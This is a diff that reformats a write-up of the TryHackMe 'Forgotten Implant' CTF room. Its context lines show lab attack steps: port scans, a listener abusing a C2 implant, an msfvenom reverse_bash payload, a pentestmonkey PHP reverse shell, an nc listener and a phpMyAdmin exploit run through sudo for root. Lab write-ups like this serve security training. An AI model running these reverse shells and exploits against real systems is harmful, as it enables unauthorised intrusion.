@@ -33,7 +33,7 @@ This is a pretty straightforward CTF-like room in which you will have to get ini
 
 
 
-If you have no prior knowledge of **Command and Control (C2**[1](#32fb3272-7074-446f-8215-2a8f2e52267f)**)**, you might want to look at the [Intro to C2](https://tryhackme.com/room/introtoc2) room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.
+If you have no prior knowledge of **Command and Control (C2**`[1](#32fb3272-7074-446f-8215-2a8f2e52267f)`**)**, you might want to look at the [Intro to C2](https://tryhackme.com/room/introtoc2) room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.
 
 
 
@@ -231,7 +231,7 @@ sudo teamserver <tun0> <password>
 
 
 
-```
+```plaintext
 [*] Generating X509 certificate and keystore (for SSL)
 Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 90 days
         for: CN=Armitage Hacker, OU=FastAndEasyHacking, O=Armitage, L=Somewhere, ST=Cyberspace, C=Earth
@@ -268,7 +268,7 @@ sudo armitage
 
 
 
-![](./img/wp-content-uploads-2023-08-armitage-connect.png)
+![armitage-connect](./img/wp-content-uploads-2023-08-armitage-connect.png)
 
 
 
@@ -322,7 +322,7 @@ sudo armitage
 
 
 
-![](./img/wp-content-uploads-2023-08-nmap-scan.png)
+![nmap-scan](./img/wp-content-uploads-2023-08-nmap-scan.png)
 
 
 
@@ -380,7 +380,7 @@ sudo armitage
 
 
 
-```
+```bash
 sudo rustscan -a 10.10.142.56 --ulimit 5000 -- -oA scans/ -sC -sV --script vuln,mysql-enum
 ```
 
@@ -388,7 +388,7 @@ sudo rustscan -a 10.10.142.56 --ulimit 5000 -- -oA scans/ -sC -sV --script vuln,
 
 
 
-```
+```bash
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -479,7 +479,7 @@ Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
 
 
 
-![](./img/wp-content-uploads-2023-08-wireshark-conn.png)
+![wireshark connection](./img/wp-content-uploads-2023-08-wireshark-conn.png)
 
 
 
@@ -508,7 +508,7 @@ Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
 
 
 
-![](./img/wp-content-uploads-2023-08-wireshark-analyze.png)
+![wireshark analyze](./img/wp-content-uploads-2023-08-wireshark-analyze.png)
 
 
 
@@ -575,7 +575,7 @@ Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
 
 
 
-![](./img/wp-content-uploads-2023-08-boom-2.gif)
+![boom](./img/wp-content-uploads-2023-08-boom-2.gif)
 
 
 
@@ -599,7 +599,7 @@ sudo python3 -m http.server 81
 
 
 
-```
+```bash
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 10.10.142.56 - - [02/Aug/2023 22:16:01] code 404, message File not found
 10.10.142.56 - - [02/Aug/2023 22:16:01] "GET /heartbeat/<strong>eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjA6MTY6MDEuNTEwMDkxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9</strong> HTTP/1.1" 404 -
@@ -766,7 +766,7 @@ with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
 
 
 
-```
+```bash
 sudo su
 chmod +x forgotten-implant.py
 python3 forgotten-implant.py
@@ -776,7 +776,7 @@ python3 forgotten-implant.py
 
 
 
-```
+```bash
 Server listening on port 81
 10.10.142.56 - - [02/Aug/2023 22:45:01] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjA6NDU6MDEuNDc2MTIwIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 200 -
 10.10.142.56 - - [02/Aug/2023 22:45:02] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
@@ -790,7 +790,7 @@ Server listening on port 81
 
 
 
-```
+```bash
 <strong># NOTE</strong>
 > We are still listening with wireshark and filter...
     <strong>ip.addr==10.10.142.56</strong>
@@ -857,7 +857,7 @@ getent passwd
 
 
 
-```
+```bash
 lsb_release -a
 ```
 
@@ -871,7 +871,7 @@ lsb_release -a
 
 
 
-```
+```bash
 sudo -l
 ```
 
@@ -885,7 +885,7 @@ sudo -l
 
 
 
-```
+```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<YOUR IP> LPORT=4444 -f raw
 ```
 
@@ -899,7 +899,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<YOUR IP> LPORT=4444 -f raw
 
 
 
-```
+```bash
 > View
 > Console
 
@@ -930,7 +930,7 @@ exploit
 
 
 
-![](./img/wp-content-uploads-2023-08-gotu.png)
+![armitage 1](./img/wp-content-uploads-2023-08-gotu.png)
 
 
 
@@ -984,7 +984,7 @@ ada
 
 
 
-![](./img/wp-content-uploads-2023-08-meterpreter-online.png)
+![meterpreter online](./img/wp-content-uploads-2023-08-meterpreter-online.png)
 
 
 
@@ -1073,7 +1073,7 @@ Mode              Size  Type  Last modified              Name
 
 
 
-```
+```python
 import mysql.connector
 
 db = mysql.connector.connect(
@@ -1106,7 +1106,7 @@ for product in cursor.fetchall():
 
 
 
-```
+```bash
 > Armitage C2 search for: <strong>local_exploit_suggester</strong>
 > Select Meterpreter session
 > 2
@@ -1116,7 +1116,7 @@ for product in cursor.fetchall():
 
 
 
-```
+```bash
 msf6 > use post/multi/recon/local_exploit_suggester
 msf6 post(multi/recon/local_exploit_suggester) > set SHOWDESCRIPTION false
 SHOWDESCRIPTION => false
@@ -1154,7 +1154,7 @@ msf6 post(multi/recon/local_exploit_suggester) > run -j
 
 
 
-```
+```bash
 > Search for: su_login
 > Drag'n'Drop on to the target
 
@@ -1372,7 +1372,7 @@ sudo rustscan -a 10.10.142.56 --ulimit 5000 -- -oA scans/ -sC -sV --script vuln,
 
 
 
-```
+```bash
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -1452,7 +1452,7 @@ Connection list
 
 
 
-Don't know why but my connection is so poor even with curl I'm not getting a response, wireshark shows GET 200. Let's swap over to [**SOCA**](https://www.redhat.com/sysadmin/getting-started-socat)[**T**](https://www.redhat.com/sysadmin/getting-started-socat)
+Don't know why but my connection is so poor even with curl I'm not getting a response, wireshark shows GET 200. Let's swap over to [SOCAT](https://www.redhat.com/sysadmin/getting-started-socat)
 
 
 
@@ -1567,7 +1567,7 @@ http://127.0.0.1:8888/
 
 
 
-![](./img/wp-content-uploads-2023-08-phpmyadmin.png)
+![phpMyAdmin](./img/wp-content-uploads-2023-08-phpmyadmin.png)
 
 
 
@@ -1596,7 +1596,7 @@ http://127.0.0.1:8888/
 
 
 
-![](./img/wp-content-uploads-2023-08-exploit.png)
+![exploit](./img/wp-content-uploads-2023-08-exploit.png)
 
 
 
@@ -1716,7 +1716,7 @@ upload php-pentestmonkey.php /home/ada
 
 
 
-```
+```bash
 sudo rlwrap -cAr nc -lvnp 5555
 ```
 
@@ -1724,7 +1724,7 @@ sudo rlwrap -cAr nc -lvnp 5555
 
 
 
-```
+```bash
 python 50457 127.0.0.1 8888 / app <password> 'sudo /usr/bin/php /home/ada/php-pentestmonkey.php'
 ```
 
@@ -1732,7 +1732,7 @@ python 50457 127.0.0.1 8888 / app <password> 'sudo /usr/bin/php /home/ada/php-pe
 
 
 
-```
+```bash
 listening on [any] 5555 ...
 connect to [10.11.8.178] from (UNKNOWN) [10.10.50.10] 45666
 Linux forgottenimplant 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
